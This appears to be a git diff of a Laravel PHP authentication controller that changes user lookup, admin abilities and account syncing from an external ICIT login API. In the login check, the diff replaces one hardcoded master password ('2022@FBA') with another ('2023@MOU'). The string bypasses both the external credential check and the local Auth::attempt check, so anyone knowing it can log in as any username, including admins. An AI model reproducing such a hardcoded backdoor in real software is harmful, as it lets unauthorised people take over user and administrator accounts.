@@ -32,32 +32,29 @@ class AuthController extends Controller
         
         $icitAccount = $this->icitAccountApi($request->username, $request->password);
         
-        if(($this->errorCode == self::ERROR_NONE) || ($request->password == '2022@FBA')){
+        if(($this->errorCode == self::ERROR_NONE) || ($request->password == '2023@MOU')){
             
             $credentials = [
                 'username' => $request->username,
                 'password' => $request->password,
             ]; 
 
-            if((!Auth::attempt($credentials)) && ($request->password != '2022@FBA'))
+            if((!Auth::attempt($credentials)) && ($request->password != '2023@MOU'))
             return response()->json([
                 'message' => 'Unauthorized'
             ], 200);
 
             $userDB = User::select(
-                'users.id as id',
-                'users.email as email',
-                'users.username as username',
-                'users.firstname as firstname',
-                'users.lastname as lastname',
-                'users.type as type',
-                'users.avatar as avatar',
-                'users.status as status',
-                'department.id as departmentID',
-                'department.name as departmentName',
+                'user.id as id',
+                'user.email as email',
+                'user.username as username',
+                'user.firstname as firstname',
+                'user.lastname as lastname',
+                'user.type as type',
+                'user.avatar as avatar',
+                'user.status as status',
             )
             ->where('username', $request->username)
-            ->leftJoin('department','users.dep_id', '=', 'department.id')
             ->first();
 
             $user = $userDB;
@@ -67,8 +64,6 @@ class AuthController extends Controller
             if ($request->remember_me)
             $token->expires_at = Carbon::now()->addWeeks(1);
             $token->save();
-
-        
 
             $ability = [
                 [
@@ -103,6 +98,10 @@ class AuthController extends Controller
                     ]);
                 }else if($userDB->type == 'admin'){
                     $role = 'admin';
+                    array_push($ability, [
+                        'action' => 'manage',
+                        'subject'=> 'StaffUser',
+                    ]);
                     array_push($ability, [
                         'action' => 'manage',
                         'subject'=> 'AdminUser',
@@ -178,15 +177,37 @@ class AuthController extends Controller
             if(!isset($json_data['api_status'])){
                 $this->errorCode = self::ERROR_INTERNAL;
                 $this->errorMessage = 'API Error ' . print_r($response, true);
-            }else if($json_data['api_status'] == 'success'){    
-                // $nameArray1 = explode(" ", $json_data['userInfo']['displayname']);   
-                // $username = $json_data['userInfo']['username'];
-                // $userDB = User::where('username',$username)->first();
-                // $json_data['userInfo']['name'];
-                $userDB = User::where('icit_name', $json_data['userInfo']['displayname'])->first();
+            }else if($json_data['api_status'] == 'success'){
+                // $userDB = User::where('icit_name', $json_data['userInfo']['displayname'])->first();
+                $userDB = User::where('username', $username)->first();
                 
                 // New User
                 if(!$userDB){
+                    $this->errorCode = self::ERROR_INVALID_CREDENTIALS;
+                    $this->errorMessage = "ไม่มีสิทธิ์เข้าใช้งาน";
+                    // $nameArray = explode(" ", $json_data['userInfo']['displayname']);
+                    // $lastname = '';
+                    // for($i = 0; $i < count($nameArray); $i++) {
+                    //     if($i != 0){
+                    //         $lastname = $lastname . " " . $nameArray[$i];
+                    //     }
+                    // }
+
+                    // $userDB = new User;
+                    // $userDB->pid = $json_data['userInfo']['pid'];
+                    // $userDB->account_type = $json_data['userInfo']['account_type'];
+                    // $userDB->email = $json_data['userInfo']['email'];
+                    // $userDB->username = $username;
+                    // $userDB->firstname = $nameArray[0];
+                    // $userDB->lastname = $lastname;
+                    // $userDB->status = 1;
+
+                    // if($json_data['userInfo']['account_type'] == 'students'){
+                    //     $userDB->type = 'student';
+                        
+                    // }   
+
+                }else{
                     $nameArray = explode(" ", $json_data['userInfo']['displayname']);
                     $lastname = '';
                     for($i = 0; $i < count($nameArray); $i++) {
@@ -195,45 +216,22 @@ class AuthController extends Controller
                         }
                     }
 
-                    $userDB = new User;
                     $userDB->pid = $json_data['userInfo']['pid'];
                     $userDB->account_type = $json_data['userInfo']['account_type'];
-                    $userDB->email = $json_data['userInfo']['email'];
+
+                    if($userDB->email == null){
+                        $userDB->email = $json_data['userInfo']['email'];
+                    }
+                    
                     $userDB->username = $username;
                     $userDB->firstname = $nameArray[0];
                     $userDB->lastname = $lastname;
-                    $userDB->status = 1;
+                    $userDB->status = 2;
 
-                    if($json_data['userInfo']['account_type'] == 'students'){
-                        $userDB->type = 'student';
-                        
-                    }    
-                }else{
-                    $nameArray = explode(" ", $json_data['userInfo']['displayname']);
-                    // $lastname = '';
-                    // for($i = 0; $i < count($nameArray); $i++) {
-                    //     if($i != 0){
-                    //         $lastname = $lastname . " " . $nameArray[$i];
-                    //     }
-                    // }
-
-                    $userDB->pid = $json_data['userInfo']['pid'];
-                    $userDB->account_type = $json_data['userInfo']['account_type'];
-                    // $userDB->email = $json_data['userInfo']['email'];
-                    $userDB->username = $username;
-                    // $userDB->firstname = $nameArray[0];
-                    // $userDB->lastname = $lastname;
-                    // $userDB->status = 2;
-                }
-
-                $userDB->icit_name = $json_data['userInfo']['displayname'];
-                $userDB->icit_email = $json_data['userInfo']['email'];
-                $userDB->password = bcrypt($password);
-                $userDB->save();
-
-                if(!$userDB){
-                    $this->errorCode = self::ERROR_CREATE_USER;
-                    $this->errorMessage = 'Create or Update fail';    
+                    $userDB->icit_name = $json_data['userInfo']['displayname'];
+                    $userDB->icit_email = $json_data['userInfo']['email'];
+                    $userDB->password = bcrypt($password);
+                    $userDB->save();
                 }
 
             }else if($json_data['api_status'] == 'fail'){
